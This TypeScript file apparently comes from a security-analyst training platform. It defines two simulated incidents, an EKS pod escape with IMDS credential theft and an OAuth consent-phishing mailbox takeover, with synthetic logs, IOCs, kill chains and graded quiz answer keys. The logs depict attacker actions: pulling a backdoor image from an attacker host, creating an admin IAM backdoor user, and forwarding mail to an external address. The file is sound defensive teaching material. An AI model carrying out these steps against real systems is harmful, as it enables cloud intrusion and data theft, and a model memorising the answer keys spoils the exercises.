      event_type: "cloud_api_call", severity: "medium", mitre_technique: "T1552.005",
      src_ip: "185.220.101.47", dst_port: 443,
      description: "GetCallerIdentity was called using the eks-node-role assumed role from 185.220.101.47 — an IP outside AWS's published ranges.",
      fp_explanation: "GetCallerIdentity is one of the most common calls in any AWS account — the SDKs issue it on startup to confirm which identity they are running as, so it appears constantly in CloudTrail for healthy workloads.",
      raw: {
        "aws.cloudtrail.eventName": "GetCallerIdentity",
        "aws.cloudtrail.eventSource": "sts.amazonaws.com",
        "aws.cloudtrail.userIdentity.type": "AssumedRole",
        "aws.cloudtrail.userIdentity.arn": "arn:aws:sts::123456789012:assumed-role/eks-node-role/i-0abc123",
        "aws.cloudtrail.userIdentity.accountId": "123456789012",
        "aws.cloudtrail.sourceIPAddress": "185.220.101.47",
        "aws.cloudtrail.userAgent": "aws-cli/2.13.0 Python/3.11.4",
        "aws.cloudtrail.errorCode": "",
        "aws.cloudtrail.responseElements.Account": "123456789012",
      },
    },
    {
      id: "k8s_06_list_buckets",
      ts: T(6 * MIN),
      source: "cloudtrail", vendor: "AWS CloudTrail",
      event_type: "cloud_api_call", severity: "high", mitre_technique: "T1580",
      src_ip: "185.220.101.47",
      description: "ListBuckets was called using the same assumed role from the same external IP, returning 14 buckets.",
      raw: {
        "aws.cloudtrail.eventName": "ListBuckets",
        "aws.cloudtrail.eventSource": "s3.amazonaws.com",
        "aws.cloudtrail.userIdentity.type": "AssumedRole",
        "aws.cloudtrail.userIdentity.arn": "arn:aws:sts::123456789012:assumed-role/eks-node-role/i-0abc123",
        "aws.cloudtrail.sourceIPAddress": "185.220.101.47",
      },
    },
    {
      id: "k8s_07_describe_instances",
      ts: T(7 * MIN),
      source: "cloudtrail", vendor: "AWS CloudTrail",
      event_type: "cloud_api_call", severity: "high", mitre_technique: "T1580",
      src_ip: "185.220.101.47",
      description: "DescribeInstances was called using the same assumed role, requesting up to 1000 results.",
      raw: {
        "aws.cloudtrail.eventName": "DescribeInstances",
        "aws.cloudtrail.eventSource": "ec2.amazonaws.com",
        "aws.cloudtrail.userIdentity.type": "AssumedRole",
        "aws.cloudtrail.userIdentity.arn": "arn:aws:sts::123456789012:assumed-role/eks-node-role/i-0abc123",
        "aws.cloudtrail.sourceIPAddress": "185.220.101.47",
        "aws.cloudtrail.requestParameters.maxResults": 1000,
      },
    },
    {
      id: "k8s_08_secrets_access",
      ts: T(9 * MIN),
      source: "cloudtrail", vendor: "AWS CloudTrail",
      event_type: "cloud_storage_access", severity: "critical", mitre_technique: "T1530",
      src_ip: "185.220.101.47",
      description: "GetObject retrieved s3://rocketstack-secrets-prod/db-passwords.json (4,218 bytes) using the same assumed role from 185.220.101.47.",
      raw: {
        "aws.cloudtrail.eventName": "GetObject",
        "aws.cloudtrail.eventSource": "s3.amazonaws.com",
        "aws.cloudtrail.userIdentity.type": "AssumedRole",
        "aws.cloudtrail.userIdentity.arn": "arn:aws:sts::123456789012:assumed-role/eks-node-role/i-0abc123",
        "aws.cloudtrail.sourceIPAddress": "185.220.101.47",
        "aws.cloudtrail.requestParameters.bucketName": "rocketstack-secrets-prod",
        "aws.cloudtrail.requestParameters.key": "db-passwords.json",
        "aws.cloudtrail.responseElements.contentLength": 4218,
      },
    },
    {
      id: "k8s_09_privileged_pod",
      ts: T(12 * MIN),
      source: "k8s_audit", vendor: "Kubernetes Audit",
      event_type: "k8s_pod_create", severity: "critical", mitre_technique: "T1610",
      src_ip: "185.220.101.47",
      description: "ci-deploy-token created a pod named svc-monitoring-backup in kube-system with hostPID, hostNetwork, and privileged:true, pulling its image from 185.220.101.47:5000.",
      raw: {
        "kubernetes.audit.verb": "create",
        "kubernetes.audit.objectRef.resource": "pods",
        "kubernetes.audit.objectRef.namespace": "kube-system",
        "kubernetes.audit.objectRef.name": "svc-monitoring-backup",
        "kubernetes.audit.user.username": "ci-deploy-token",
        "kubernetes.audit.sourceIPs[0]": "185.220.101.47",
        "kubernetes.audit.responseStatus.code": 201,
        "kubernetes.audit.requestObject.spec.hostPID": true,
        "kubernetes.audit.requestObject.spec.hostNetwork": true,
        "kubernetes.audit.requestObject.spec.containers[0].securityContext.privileged": true,
        "kubernetes.audit.requestObject.spec.containers[0].image": "185.220.101.47:5000/backdoor:latest",
      },
    },
    {
      id: "k8s_10_iam_backdoor",
      ts: T(15 * MIN),
      source: "cloudtrail", vendor: "AWS CloudTrail",
      event_type: "account_create", severity: "critical", mitre_technique: "T1136.003",
      src_ip: "185.220.101.47",
      // SPLIT from a single record that carried eventName "CreateUser" together
      // with requestParameters.policyArn. CreateUser accepts userName, path and
      // tags — never a policy ARN. Attaching a managed policy is a separate
      // AttachUserPolicy call, and merging them hid the single most important
      // pivot in the scenario: the moment the privilege was actually granted.
      description: "CreateUser created IAM user svc-monitoring-backup, called with the eks-node-role assumed role from 185.220.101.47.",
      raw: {
        "aws.cloudtrail.eventName": "CreateUser",
        "aws.cloudtrail.eventSource": "iam.amazonaws.com",
        "aws.cloudtrail.userIdentity.type": "AssumedRole",
        "aws.cloudtrail.userIdentity.arn": "arn:aws:sts::123456789012:assumed-role/eks-node-role/i-0abc123",
        "aws.cloudtrail.sourceIPAddress": "185.220.101.47",
        "aws.cloudtrail.requestParameters.userName": "svc-monitoring-backup",
        "aws.cloudtrail.requestParameters.path": "/",
        "aws.cloudtrail.responseElements.user.userId": "AIDIODR4TAW7CSEXAMPLE",
        "aws.cloudtrail.responseElements.user.arn": "arn:aws:iam::123456789012:user/svc-monitoring-backup",
      },
    },
    {
      id: "k8s_11_iam_policy_attach",
      ts: T(15 * MIN + 11_000),
      source: "cloudtrail", vendor: "AWS CloudTrail",
      event_type: "cloud_role_change", severity: "critical", mitre_technique: "T1098.003",
      src_ip: "185.220.101.47",
      description: "AttachUserPolicy attached the AWS-managed AdministratorAccess policy to svc-monitoring-backup, eleven seconds after the account was created.",
      raw: {
        "aws.cloudtrail.eventName": "AttachUserPolicy",
        "aws.cloudtrail.eventSource": "iam.amazonaws.com",
        "aws.cloudtrail.userIdentity.type": "AssumedRole",
        "aws.cloudtrail.userIdentity.arn": "arn:aws:sts::123456789012:assumed-role/eks-node-role/i-0abc123",
        "aws.cloudtrail.sourceIPAddress": "185.220.101.47",
        "aws.cloudtrail.requestParameters.userName": "svc-monitoring-backup",
        "aws.cloudtrail.requestParameters.policyArn": "arn:aws:iam::aws:policy/AdministratorAccess",
        "aws.cloudtrail.responseElements": "null",
      },
    },
  ];

  const iocs: IOC[] = [
    { type: "ip",     value: "185.220.101.47", reputation: "malicious", tags: ["tor-exit-node", "attacker-source", "imds-query-origin", "cloudtrail-source"] },
    { type: "user",   value: "svc-monitoring-backup", reputation: "malicious", tags: ["iam-principal", "administrator-access", "persistence"] },
    // Were two `sha256` IOCs seeded from strings like
    // "eks-node-role-credentials-stolen". Neither appeared in any event, and
    // neither could: IAM credentials and an S3 object fetched via GetObject
    // produce no file hash in this telemetry. Replaced with indicators the
    // analyst can actually pivot on.
    { type: "user",   value: "arn:aws:sts::123456789012:assumed-role/eks-node-role/i-0abc123", reputation: "suspicious", tags: ["assumed-role", "credential-source"] },
    { type: "url",    value: "s3://rocketstack-secrets-prod/db-passwords.json", reputation: "suspicious", tags: ["accessed-object", "secrets-bucket"] },
    { type: "host",   value: "185.220.101.47:5000", reputation: "malicious", tags: ["attacker-registry", "image-source"] },
  ];

  const killchain = [
    { ts: T(0),           phase: "Execution",         action: "kubectl exec into api-prod container via compromised CI/CD token from Tor exit node 185.220.101.47" },
    { ts: T(2 * MIN),     phase: "Execution",         action: "nsenter with full host namespaces — container escape to EC2 node OS, root access achieved" },
    { ts: T(3 * MIN),     phase: "Credential Access", action: "curl to 169.254.169.254 IMDS — IAM role credentials for eks-node-role retrieved" },
    { ts: T(5 * MIN),     phase: "Credential Access", action: "GetCallerIdentity from external IP confirms stolen credentials are valid" },
    { ts: T(6 * MIN),     phase: "Discovery",         action: "ListBuckets + DescribeInstances — attacker mapping entire AWS account from outside" },
    { ts: T(9 * MIN),     phase: "Exfiltration",      action: "GetObject s3://rocketstack-secrets-prod/db-passwords.json — production DB credentials stolen" },
    { ts: T(12 * MIN),    phase: "Persistence",       action: "Privileged pod 'svc-monitoring-backup' created in kube-system with hostPID+hostNetwork" },
    { ts: T(15 * MIN),    phase: "Persistence",       action: "IAM user 'svc-monitoring-backup' created with AdministratorAccess — cloud-level backdoor established" },
  ];

  const questions: ScenarioQuestion[] = [
    {
      id: "q1", xp: 15,
      prompt: "Event 1 (kubectl exec) has a FP explanation. What specific detail in the event definitively makes it suspicious?",
      kind: "single",
      options: [
        { value: "a", label: "The container name 'api-prod-7f8b9c' does not match the deployment naming convention used in this cluster" },
        { value: "b", label: "kubectl exec that spawns an interactive shell in a production namespace is malicious regardless of source" },
        { value: "c", label: "The source IP 185.220.101.47 is not an internal or corporate IP — it is a known Tor exit node" },
        { value: "d", label: "The CI/CD service account token was used, and pipeline tokens should be scoped to deployments, not exec" },
      ],
      answer: "c",
      explanation: "kubectl exec from an internal developer IP is routine. kubectl exec from 185.220.101.47 (a known Tor exit node, verifiable via threat intel) is immediately suspicious — legitimate CI/CD pipelines don't route through Tor. This is the distinguishing detail that separates routine debugging from an intrusion.",
    },
    {
      id: "q2", xp: 20,
      prompt: "Event 3 (curl to 169.254.169.254) is described as an AWS Instance Metadata Service query. Why is this particularly dangerous in a Kubernetes context?",
      kind: "single",
      options: [
        { value: "a", label: "It exposes the container's environment variables, including any secrets the pod spec injected as plaintext env entries" },
        { value: "b", label: "The IMDS returns IAM role credentials that grant cloud API access OUTSIDE the cluster — the attacker moves from container to cloud" },
        { value: "c", label: "It lets the attacker sniff traffic from other pods on the same node, since containers share the host network namespace" },
        { value: "d", label: "A successful IMDS response confirms the attacker has already broken out of the container onto the underlying EC2 worker node" },
      ],
      answer: "b",
      explanation: "The IMDS link-local address (169.254.169.254) is accessible from any process on the EC2 node, including containers. After the nsenter escape, the attacker queries IMDS from the host OS and receives the IAM role credentials attached to the EC2 node. These credentials are valid AWS API keys — the attack pivots from the Kubernetes cluster into the entire AWS account.",
    },
    {
      id: "q3", xp: 20,
      prompt: "Events 5-7 (GetCallerIdentity, ListBuckets, DescribeInstances) show AWS API calls from IP 185.220.101.47. What is the critical anomaly?",
      kind: "single",
      options: [
        { value: "a", label: "The calls were made over plain HTTP to the AWS endpoint, so the SigV4 signature and session token travelled in the clear" },
        { value: "b", label: "The IAM role eks-node-role is over-permissive — a node role needs EC2 and ECR permissions, not s3:ListAllMyBuckets across the account" },
        { value: "c", label: "The source IP 185.220.101.47 is not an AWS IP range — legitimate EC2 role usage comes from AWS IP ranges, not external IPs" },
        { value: "d", label: "sts:GetCallerIdentity returned the full account ID and role ARN, handing the attacker the account details needed to plan escalation" },
      ],
      answer: "c",
      explanation: "When an EC2 instance uses its IAM role normally, CloudTrail shows the source IP as the EC2's private or public IP (within AWS IP ranges). Seeing eks-node-role calls from an external IP (185.220.101.47) means the credentials were stolen and are being used from outside AWS — a clear indicator of IMDS credential theft.",
    },
    {
      id: "q4", xp: 25,
      prompt: "What is the correct priority order for containing this incident?",
      kind: "single",
      options: [
        { value: "a", label: "Delete the backdoor IAM user → Rotate EKS node credentials → Delete privileged pod → Investigate how CI/CD token was stolen" },
        { value: "b", label: "Rotate all IAM credentials first → Then investigate the K8s cluster" },
        { value: "c", label: "Isolate EKS node, revoke eks-node-role credentials, delete 'svc-monitoring-backup' IAM user, delete privileged pod, rotate CI/CD deploy token, enable IMDSv2" },
        { value: "d", label: "Notify AWS support and wait for guidance" },
      ],
      answer: "c",
      explanation: "Correct sequence: (1) Revoke eks-node-role credentials immediately — stops all active cloud API calls. (2) Delete the svc-monitoring-backup IAM user — closes the cloud-level backdoor. (3) Delete the privileged pod in kube-system — closes the cluster-level backdoor. (4) Rotate the compromised CI/CD deploy token — closes initial access. (5) Enforce IMDSv2 (requires session-oriented requests, blocks SSRF-style IMDS access).",
    },
  ];

  return {
    scenario_id: scenarioId,
    title: "Kubernetes Pod Escape → Cloud Metadata Theft",
    threat_actor: "APT40",
    attack_kind: "Cloud Attack / Container Escape",
    briefing: "GuardDuty raised a finding against the production EKS cluster at 02:50 for anomalous use of the eks-node-role credentials. The Kubernetes audit log separately shows exec activity into container api-prod-7f8b9c by the ci-deploy-token service account.",
    narrative: "APT40 obtains a compromised CI/CD deploy token and uses it to exec into a production container via kubectl. Using nsenter, they escape to the EC2 node OS and query the AWS Instance Metadata Service (169.254.169.254) to steal the IAM role credentials bound to the node. From an external IP (Tor exit node), they enumerate the entire AWS account, access a secrets S3 bucket containing production database passwords, create a privileged pod in kube-system for cluster persistence, and create a backdoor IAM user with AdministratorAccess. Three log sources must be correlated: Kubernetes audit, EDR on the node, and AWS CloudTrail.",
    learning_objectives: [
      "Understand the container escape path: kubectl exec → nsenter → host OS access",
      "Know that IMDS (169.254.169.254) queries from containers can steal IAM credentials",
      "Identify that CloudTrail API calls from external IPs using EC2 role = credential theft",
      "Correlate three independent log sources (K8s audit + EDR + CloudTrail) into one attack chain",
    ],
    alerts: eventsToAlerts(events, scenarioId),
    events, iocs, killchain, questions,
  };
}

// ─── OAuth Consent Grant Phishing — Silent BEC (⭐⭐⭐⭐ Expert) ─────────────

export function buildOAuthConsentPhishingScenario(scenarioId = "oauth-consent-grant-phishing"): ScenarioBundle {
  const B = new Date("2026-06-13T22:14:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;
  const APP_ID = "a3f9b1c2-d4e5-4f67-8901-ab2cd3ef4567";

  const events: TelemetryEvent[] = [
    {
      id: "oauth_01_consent_grant",
      ts: T(0),
      source: "ad", vendor: "Microsoft Entra ID",
      event_type: "role_assignment", severity: "high", mitre_technique: "T1528",
      hostname: "aad.nexacorp.com", user_email: "j.chen@nexacorp.com", src_ip: "207.154.110.53",
      description: "j.chen granted OAuth consent to an app named Productivity Suite Pro, requesting Mail.ReadWrite, Files.ReadWrite.All, and Calendars.Read.",
      fp_explanation: "OAuth consent grants are extremely common — users consent to dozens of productivity apps. This looks like Slack/Zoom/Notion onboarding from a corporate IP, at a time the user is still at the office (22:14).",
      raw: {
        "data.office365.Operation": "Consent to application",
        "data.office365.AzureActiveDirectoryEventType": 1,
        "data.office365.UserId": "j.chen@nexacorp.com",
        "data.office365.ActorIpAddress": "207.154.110.53",
        "data.office365.Target[0].ID": APP_ID,
        "data.office365.Target[0].Type": "1",
        "data.office365.ExtendedProperties[0].Name": "AppDisplayName",
        "data.office365.ExtendedProperties[0].Value": "Productivity Suite Pro",
        "data.office365.ExtendedProperties[1].Name": "Permissions",
        "data.office365.ExtendedProperties[1].Value": "Mail.ReadWrite Files.ReadWrite.All Calendars.Read",
        "data.office365.ExtendedProperties[2].Name": "AppId",
        "data.office365.ExtendedProperties[2].Value": APP_ID,
        "data.office365.ResultStatus": "Success",
      },
    },
    {
      id: "oauth_02_mail_access",
      ts: T(55 * MIN),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log",
      event_type: "cloud_api_call", severity: "high", mitre_technique: "T1114.002",
      hostname: "graph.microsoft.com", user_email: "j.chen@nexacorp.com", src_ip: "40.99.8.12",
      description: "The Productivity Suite Pro app accessed 1,247 items in j.chen's mailbox via Microsoft Graph, 55 minutes after consent was granted.",
      fp_explanation: "MailItemsAccessed by an application is common — CRM tools and archival apps do this constantly. The Microsoft 365 compliance center logs thousands of these per day.",
      raw: {
        "data.office365.Operation": "MailItemsAccessed",
        "data.office365.UserId": "j.chen@nexacorp.com",
        "data.office365.ClientInfoString": "Client=OWA;Action=ViaProxy",
        "data.office365.AppId": APP_ID,
        "data.office365.ClientIPAddress": "40.99.8.12",
        "data.office365.Workload": "Exchange",
        "data.office365.OperationCount": 1247,
        "data.office365.AccessedItems[0].InternetMessageId": "<msg-batch-01@nexacorp.com>",
      },
    },
    {
      id: "oauth_03_folder_enum",
      ts: T(56 * MIN),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log",
      event_type: "cloud_api_call", severity: "high", mitre_technique: "T1114.002",
      hostname: "graph.microsoft.com", user_email: "j.chen@nexacorp.com", src_ip: "40.99.8.12",
      description: "The same app called MailFolders.List and enumerated all 43 of j.chen's mailbox folders.",
      raw: {
        "data.office365.Operation": "MailFolders.List",
        "data.office365.UserId": "j.chen@nexacorp.com",
        "data.office365.AppId": APP_ID,
        "data.office365.ClientIPAddress": "40.99.8.12",
        "data.office365.Workload": "Exchange",
        "data.office365.ResponseCount": 43,
        "data.office365.ClientInfoString": "Client=Graph;Application=Productivity Suite Pro",
      },
    },
    {
      id: "oauth_04_inbox_rule",
      ts: T(58 * MIN),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log",
      event_type: "policy_modification", severity: "high", mitre_technique: "T1114.003",
      hostname: "outlook.office365.com", user_email: "j.chen@nexacorp.com", src_ip: "40.99.8.12",
      description: "New-InboxRule was created with UserId set to the app's own ID (not j.chen), forwarding all mail to backupmail@productivity-suite.pro.",
      raw: {
        "data.office365.Operation": "New-InboxRule",
        "data.office365.UserId": APP_ID,
        "data.office365.Workload": "Exchange",
        "data.office365.ClientIPAddress": "40.99.8.12",
        "data.office365.Parameters[0].Name": "Name",
        "data.office365.Parameters[0].Value": "Backup Sync Rule",
        "data.office365.Parameters[1].Name": "ForwardTo",
        "data.office365.Parameters[1].Value": "backupmail@productivity-suite.pro",
        "data.office365.Parameters[2].Name": "MarkAsRead",
        "data.office365.Parameters[2].Value": "True",
        "data.office365.Parameters[3].Name": "ApplyToAllMessages",
        "data.office365.Parameters[3].Value": "True",
      },
    },
    {
      id: "oauth_05_sharepoint_bulk",
      ts: T(62 * MIN),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log",
      event_type: "sharepoint_access", severity: "high", mitre_technique: "T1530",
      hostname: "nexacorp.sharepoint.com", user_email: "j.chen@nexacorp.com", src_ip: "40.99.8.12",
      description: "312 files on the Finance SharePoint site were accessed with UserId set to the app's own ID.",
      raw: {
        "data.office365.Operation": "FileAccessed",
        "data.office365.UserId": APP_ID,
        "data.office365.Workload": "SharePoint",
        "data.office365.ClientIPAddress": "40.99.8.12",
        "data.office365.SiteUrl": "https://nexacorp.sharepoint.com/sites/Finance",
        "data.office365.ObjectId": "https://nexacorp.sharepoint.com/sites/Finance/Documents",
        "data.office365.ItemType": "File",
        "data.office365.AccessCount": 312,
      },
    },
    {
      id: "oauth_06_calendar_read",
      ts: T(65 * MIN),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log",
      event_type: "cloud_api_call", severity: "medium", mitre_technique: "T1114.002",
      hostname: "graph.microsoft.com", user_email: "j.chen@nexacorp.com", src_ip: "40.99.8.12",
      description: "CalendarEvents.List returned 847 of j.chen's calendar events spanning the last 90 days.",
      raw: {
        "data.office365.Operation": "CalendarEvents.List",
        "data.office365.UserId": APP_ID,
        "data.office365.AppId": APP_ID,
        "data.office365.ClientIPAddress": "40.99.8.12",
        "data.office365.Workload": "Exchange",
        "data.office365.QueryParameters.startDateTime": "2026-03-15T00:00:00Z",
        "data.office365.QueryParameters.endDateTime": "2026-06-13T23:59:59Z",
        "data.office365.ResponseCount": 847,
      },
    },
    {
      id: "oauth_07_admin_consent_fail",
      ts: T(70 * MIN),
      source: "ad", vendor: "Microsoft Entra ID",
      event_type: "role_assignment", severity: "high", mitre_technique: "T1528",
      hostname: "aad.nexacorp.com", src_ip: "40.99.8.12",
      description: "Productivity Suite Pro requested AllPrincipals (tenant-wide) consent from 40.99.8.12 — the request failed with InsufficientPrivileges.",
      raw: {
        "data.office365.Operation": "Consent to application",
        "data.office365.AzureActiveDirectoryEventType": 1,
        "data.office365.ActorIpAddress": "40.99.8.12",
        "data.office365.Target[0].ID": APP_ID,
        "data.office365.ExtendedProperties[0].Name": "ConsentType",
        "data.office365.ExtendedProperties[0].Value": "AllPrincipals",
        "data.office365.ResultStatus": "Failure",
        "data.office365.ResultStatusDetail": "InsufficientPrivileges",
      },
    },
    {
      id: "oauth_08_dlp_contract",
      ts: T(72 * MIN),
      source: "dlp", vendor: "Microsoft Purview",
      event_type: "dlp_alert", severity: "critical", mitre_technique: "T1530",
      hostname: "nexacorp.sharepoint.com", user_email: "j.chen@nexacorp.com",
      description: "Microsoft Purview DLP fired its Confidential Documents — Approved Apps Only policy when Contract-GlobalLogis-2026.docx was accessed by the unverified app.",
      raw: {
        "data.office365.Operation": "DlpRuleMatch",
        "data.office365.Workload": "SharePoint",
        "data.office365.UserId": APP_ID,
        "data.office365.PolicyDetails[0].PolicyName": "Confidential Documents — Approved Apps Only",
        "data.office365.PolicyDetails[0].Rules[0].RuleName": "Non-approved application accessing confidential file",
        "data.office365.PolicyDetails[0].Rules[0].Severity": "High",
        "data.office365.ExchangeMetaData.Attachment": "Contract-GlobalLogis-2026.docx",
        "data.office365.IncidentId": "DLP-2026-06-13-91847",
      },
    },
    {
      id: "oauth_09_ueba_risk_spike",
      ts: T(75 * MIN),
      source: "ueba", vendor: "Microsoft Sentinel UEBA",
      event_type: "risk_score_change", severity: "critical", mitre_technique: "T1528",
      hostname: "sentinel.nexacorp.com", user_email: "j.chen@nexacorp.com",
      description: "Microsoft Sentinel UEBA raised the Productivity Suite Pro service principal's risk score from 8 to 91.",
      raw: {
        "ueba.entity_type": "ServicePrincipal",
        "ueba.entity_id": APP_ID,
        "ueba.risk_score": 91,
        "ueba.previous_risk_score": 8,
        "ueba.alert_severity": "High",
        "ueba.investigation_priority": 84,
        "ueba.peer_group": "SaaS-Applications",
        "ueba.peer_risk_score_avg": 12,
      },
    },
    {
      id: "oauth_10_app_registration_retrospective",
      ts: T(-48 * 60 * MIN),
      source: "ad", vendor: "Microsoft Entra ID",
      event_type: "account_create", severity: "high", mitre_technique: "T1528",
      hostname: "aad.nexacorp.com",
      description: "The Productivity Suite Pro app was registered in Entra ID with an unverified publisher and a redirect URI at productivty-suite.com.",
      raw: {
        "data.office365.Operation": "Add application.",
        "data.office365.AzureActiveDirectoryEventType": 1,
        "data.office365.Target[0].ID": APP_ID,
        "data.office365.ExtendedProperties[0].Name": "AppDisplayName",
        "data.office365.ExtendedProperties[0].Value": "Productivity Suite Pro",
        "data.office365.ExtendedProperties[1].Name": "ReplyUrls",
        "data.office365.ExtendedProperties[1].Value": "https://productivty-suite.com/callback",
        "data.office365.ExtendedProperties[2].Name": "AppCreationDateTime",
        "data.office365.ExtendedProperties[2].Value": "2026-06-11T22:14:00Z",
        "data.office365.ExtendedProperties[3].Name": "PublisherVerified",
        "data.office365.ExtendedProperties[3].Value": "false",
      },
    },
  ];

  const iocs: IOC[] = [
    { type: "domain", value: "productivty-suite.com",         reputation: "malicious", tags: ["typosquat", "oauth-phishing", "redirect-uri", "missing-i"] },
    { type: "domain", value: "productivity-suite.pro",        reputation: "malicious", tags: ["exfil-inbox-target", "inbox-forwarding-domain"] },
    { type: "email",  value: "backupmail@productivity-suite.pro", reputation: "malicious", tags: ["exfil-target", "inbox-forwarding"] },
    { type: "user",   value: APP_ID,                          reputation: "malicious", tags: ["rogue-oauth-app", "productivity-suite-pro", "unverified-publisher"] },
  ];

  const killchain = [
    { ts: T(-48 * 60 * MIN), phase: "Resource Development", action: "'Productivity Suite Pro' app registered on typosquat domain productivty-suite.com" },
    { ts: T(0),        phase: "Initial Access",        action: "j.chen clicks phishing link and grants Mail.ReadWrite + Files.ReadWrite.All + Calendars.Read to rogue app" },
    { ts: T(55 * MIN), phase: "Collection",            action: "App reads 1,247 mailbox items via Graph API MailItemsAccessed at 23:09" },
    { ts: T(58 * MIN), phase: "Persistence",           action: "Inbox forwarding rule created by app principal to backupmail@productivity-suite.pro" },
    { ts: T(62 * MIN), phase: "Collection",            action: "312 SharePoint files accessed by app principal including confidential contract" },
    { ts: T(65 * MIN), phase: "Discovery",             action: "847 calendar events read — org chart reconstruction via meeting attendees" },
    { ts: T(70 * MIN), phase: "Privilege Escalation",  action: "Admin consent attempt for tenant-wide access FAILS (requires Global Admin role)" },
    { ts: T(75 * MIN), phase: "Detection",             action: "UEBA risk score spikes to 91 — SuspiciousOAuthConsent with 4 contributing behaviors" },
  ];

  const questions: ScenarioQuestion[] = [
    {
      id: "q1", xp: 25,
      prompt: "Events 1 and 2 both have FP explanations. What is the first specific detail that, if noticed, would distinguish this from a legitimate productivity app?",
      kind: "single",
      options: [
        { value: "a", label: "The app requested Mail.ReadWrite (write access is unusual for a legitimate archival tool)" },
        { value: "b", label: "The app was registered only 48 hours before the consent (Event 10 retrospective)" },
        { value: "c", label: "The source IP 207.154.110.53 is suspicious" },
        { value: "d", label: "The consent happened at 22:14 (outside business hours)" },
      ],
      answer: "b",
      explanation: "Event 10 reveals the app was registered 48 hours before the attack. Legitimate enterprise apps (Slack, Zoom, Salesforce) are years old with thousands of users. A 2-day-old app with an unverified publisher requesting broad permissions is a major red flag. The Mail.ReadWrite permission is also suspicious — read access would suffice for a legitimate archival tool.",
    },
    {
      id: "q2", xp: 20,
      prompt: "Event 4 (inbox rule creation) shows UserId as the app ID, not j.chen's email. What does this tell you?",
      kind: "single",
      options: [
        { value: "a", label: "j.chen created the rule herself in the Outlook web UI, and the audit log records the app GUID as the client identifier" },
        { value: "b", label: "The rule was created by the OAuth app using its delegated permissions — the app acted autonomously, not j.chen" },
        { value: "c", label: "The New-InboxRule operation failed because the app lacks Mail.ReadWrite, and denied attempts are logged under the app GUID" },
        { value: "d", label: "A second attacker signed in with j.chen's stolen password, and Exchange logs the registered app GUID for such sessions" },
      ],
      answer: "b",
      explanation: "When UserId in O365 audit logs is an application GUID (not a user UPN), the action was performed by the application using its granted delegated permissions. j.chen is asleep — the app is operating autonomously on her behalf using the OAuth token she granted at 22:14. This is the defining characteristic of OAuth consent phishing: no credential theft needed.",
    },
    {
      id: "q3", xp: 20,
      prompt: "Why is this attack classified as Expert difficulty when the consent grant (Event 1) happened from a legitimate corporate IP?",
      kind: "single",
      options: [
        { value: "a", label: "Because correlating Entra ID sign-in logs, the O365 unified audit log and Exchange mailbox audit into a single timeline is inherently an Expert-level task" },
        { value: "b", label: "Because no malware, no suspicious IPs in attacker activity (Events 2-9 use Microsoft IPs), no credential theft — 100% via legitimate Microsoft Graph API with delegated user consent" },
        { value: "c", label: "Because the Purview DLP policy was scoped to Exchange transport rules only, so the Graph API download path was not inspected and raised no alert" },
        { value: "d", label: "Because the infrastructure and tradecraft match a state-sponsored actor tracked by Microsoft Threat Intelligence, and that attribution raises the rating" },
      ],
      answer: "b",
      explanation: "The attack is silent by design: Events 2-9 originate from Microsoft's own IP ranges (40.99.8.12 is Azure). There is no external C2, no malware, no suspicious authentication. Traditional indicators (bad IP, bad hash, credential spray) are all absent. The only anomaly is behavioral: an app registered 48h ago with unverified publisher, making autonomous after-hours requests. This requires UEBA and app reputation analysis, not signature detection.",
    },
    {
      id: "q4", xp: 25,
      prompt: "What are the two immediate containment actions?",
      kind: "multi",
      options: [
        { value: "a", label: "Revoke the OAuth consent grant for 'Productivity Suite Pro' (App ID a3f9b1c2…) in Azure AD Enterprise Applications" },
        { value: "b", label: "Delete the inbox forwarding rule to productivity-suite.pro from j.chen's mailbox" },
        { value: "c", label: "Force a password reset for j.chen and require re-registration of their MFA method in Entra ID before re-enabling sign-in" },
        { value: "d", label: "Add 40.99.8.12 to the perimeter firewall deny list so the application can no longer reach the tenant from that address" },
      ],
      answer: ["a", "b"],
      explanation: "Priority: (1) Revoke the OAuth consent — immediately terminates the app's access token and all API access. (2) Delete the inbox forwarding rule — stops ongoing email exfiltration. Password reset (c) is wrong — the attacker never used j.chen's password; they used the OAuth token. Blocking 40.99.8.12 (d) is Microsoft's own IP and would break legitimate O365 access.",
    },
];

  return {
    scenario_id: scenarioId,
    title: "OAuth Consent Grant Phishing — Silent BEC",
    threat_actor: "APT29 / Cozy Bear",
    attack_kind: "Identity Attack / Business Email Compromise",
    briefing: "Microsoft Purview DLP fired at 23:30 when a document on the Finance SharePoint site was opened by an application named 'Productivity Suite Pro', and Sentinel UEBA raised the same service principal's risk score. The registered user is j.chen.",
    narrative: "APT29 registers a malicious Azure AD app named 'Productivity Suite Pro' on a typosquatted domain (productivty-suite.com — missing the 'i') and sends j.chen a phishing link. Chen clicks 'Allow' — granting the app Mail.ReadWrite + Files.ReadWrite.All + Calendars.Read. The app silently reads 1,247 emails, copies 312 SharePoint files including a confidential GlobalLogis contract, creates an inbox forwarding rule to an external address, and maps the org chart via calendar. No malware. No suspicious IPs. No credential theft. Everything happens through Microsoft's own Graph API using delegated permissions the user granted. The only IoCs are app registration age, unverified publisher, and a typosquatted redirect URI domain.",
    learning_objectives: [
      "Understand OAuth consent phishing: attacker uses legitimate Graph API permissions, no malware or credential theft needed",
      "Recognize that when O365 UserId is an app GUID, the app acted autonomously — not the user",
      "Identify app registration age and publisher verification as key pre-attack indicators",
      "Know that revocation of OAuth consent (not password reset) is the correct containment action",
    ],
    alerts: eventsToAlerts(events, scenarioId),
    events, iocs, killchain, questions,
  };
}

/**
 * Scenario packs live in their own files and return `alerts: []` — importing the
 * alert generator from here would create a cycle. Attach the alerts on the way
 * out so packaged scenarios reach the student's queue exactly like built-in ones.
 */
function withAlerts(build: (id?: string) => ScenarioBundle) {
  return (scenarioId?: string): ScenarioBundle => {
    const b = build(scenarioId);
    return b.alerts?.length ? b : { ...b, alerts: eventsToAlerts(b.events, b.scenario_id) };
  };
}

export function buildScenarioBySlug(slug: string): ScenarioBundle | null {
  const found = SCENARIOS.find(s => s.slug === slug);
  if (!found) return null;
  return found.build();
}
